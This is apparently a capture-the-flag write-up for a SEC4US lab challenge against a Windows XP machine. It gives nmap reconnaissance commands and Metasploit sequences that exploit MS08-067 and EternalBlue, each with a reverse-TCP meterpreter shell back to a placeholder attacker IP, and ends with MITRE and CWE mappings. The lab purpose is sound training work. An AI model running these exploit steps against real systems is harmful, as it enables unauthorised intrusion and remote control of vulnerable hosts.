# Maq103: XP e Facil

Writeup for the **XP e Facil** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 103

---

## Overview

A Windows XP machine exposed on the network with well-known critical vulnerabilities. The name says it all: "XP is Easy."

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for open ports 135 (MSRPC), 139/445 (SMB), and any other Windows services. Confirm the OS is Windows XP with:

```bash
nmap -O [TARGET_IP]
```

## Exploitation

Windows XP is vulnerable to MS08-067 (NetAPI buffer overflow) and MS17-010 (EternalBlue). Try MS08-067 first:

```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

If MS08-067 fails, attempt MS17-010:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

## Post-Exploitation

With a SYSTEM shell, search for the flag:

```
dir /s /b C:\flag*
type C:\[FLAG_PATH]
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Exploitation of Remote Services | T1210 |

### CWE

- **CWE-120:** Buffer Copy without Checking Size of Input (MS08-067)
- **CWE-787:** Out-of-bounds Write (MS17-010)

---

When an operating system announces its own fragility in the challenge title, the only real question is which classic exploit you reach for first.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
